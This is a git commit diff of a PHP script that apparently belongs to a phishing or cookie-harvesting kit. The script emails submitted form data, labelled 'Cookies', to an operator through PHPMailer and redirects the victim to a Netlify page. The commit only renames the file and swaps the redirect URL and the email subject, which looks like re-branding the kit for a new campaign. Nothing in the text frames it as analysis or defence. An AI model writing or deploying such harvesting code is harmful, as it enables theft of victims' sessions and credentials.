f4302d7d55cb276056e1da84fb924b5ec59176dd
advastong542 <advastingteam51@gmail.com>
2025-07-16 01:40:08 +0500

    Update and rename MF.php to Kamarn1.php

--- Kamarn1.php
+++ Kamarn1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://your-open-more.netlify.app/");
+header("Location: https://sure-to-user-here.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'mf Cookies';
+        $mail->Subject = 'kamarn1 Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
